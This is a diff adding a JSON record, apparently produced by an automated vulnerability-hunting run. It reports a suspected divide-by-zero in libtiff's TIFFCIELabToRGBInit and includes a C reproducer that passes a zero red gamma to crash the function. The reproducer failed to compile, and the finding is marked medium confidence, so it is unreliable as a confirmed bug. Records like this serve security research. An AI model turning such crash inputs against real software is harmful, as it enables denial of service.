@@ -1,0 +1,18 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "libtiff/tif_color.c",
+    "line": 146,
+    "function": "TIFFCIELabToRGBInit",
+    "bug_type": "divide-by-zero",
+    "cwe": "CWE-369",
+    "confidence": "medium",
+    "explanation": "dfGamma is computed as 1.0 / cielab->display.d_gammaR. If d_gammaR is 0, this triggers a floating-point divide-by-zero.",
+    "abs_path": "/tmp/libtiff_upstream/libtiff/tif_color.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <string.h>\n#include <fenv.h>\n#include <tiffio.h>\n\n/* feenableexcept is a GNU extension; declare it explicitly to avoid missing prototype warnings */\nextern int feenableexcept(int);\n\nint main(void) {\n    /* Enable floating-point exceptions so 1.0/0.0 triggers SIGFPE */\n    feenableexcept(FE_DIVBYZERO | FE_INVALID | FE_OVERFLOW);\n\n    TIFFCIELabToRGB cielab;            /* Conversion state (created on stack) */\n    TIFFDisplay disp;                  /* Display parameters provided to init */\n    float refWhite[3] = { 1.0f, 1.0f, 1.0f }; /* Any valid ref white */\n\n    /* Initialize display parameters with sane defaults, except set d_gammaR=0 to trigger divide-by-zero */\n    memset(&disp, 0, sizeof(disp));\n\n    /* Identity matrix (not used by the immediate crashing path, but set for completeness) */\n    disp.d_mat[0][0] = 1.0f; disp.d_mat[0][1] = 0.0f; disp.d_mat[0][2] = 0.0f;\n    disp.d_mat[1][0] = 0.0f; disp.d_mat[1][1] = 1.0f; disp.d_mat[1][2] = 0.0f;\n    disp.d_mat[2][0] = 0.0f; disp.d_mat[2][1] = 0.0f; disp.d_mat[2][2] = 1.0f;\n\n    /* Luminance and offsets */\n    disp.d_YCR = 1.0f; disp.d_YCG = 1.0f; disp.d_YCB = 1.0f;\n    disp.d_Y0R = 0.0f; disp.d_Y0G = 0.0f; disp.d_Y0B = 0.0f;\n\n    /* White point voltages (arbitrary, but reasonable) */\n    disp.d_Vrwr = 255.0f; disp.d_Vrwg = 255.0f; disp.d_Vrwb = 255.0f;\n\n    /* Set gamma values: RED gamma is zero to trigger the bug; others valid */\n    disp.d_gammaR = 0.0f;   /* This will cause dfGamma = 1.0 / 0.0 */\n    disp.d_gammaG = 2.2f;\n    disp.d_gammaB = 2.2f;\n\n    /* Call into the vulnerable initializer. The divide-by-zero occurs at line ~146 in tif_color.c */\n    /* This should raise SIGFPE due to enabled FP exceptions. */\n    (void)TIFFCIELabToRGBInit(&cielab, &disp, refWhite);\n\n    /* If we get here, the divide-by-zero didn't trap (unexpected with feenableexcept). */\n    puts(\"TIFFCIELabToRGBInit returned without FP exception (unexpected)\");\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "REPRODUCER_BUILD_FAIL",
+    "compile_error": "In file included from /app/se_runs/b3/libtiff_f324415_vul/findings/tif_color_146_divide-by-zero/reproducer.c:4:\nIn file included from /tmp/libtiff_upstream/libtiff/tiffio.h:31:\n/tmp/libtiff_upstream/libtiff/tiff.h:28:10: fatal error: 'tiffconf.h' file not found\n#include \"tiffconf.h\"\n         ^~~~~~~~~~~~\n1 error generated.\n"
+  }
+}
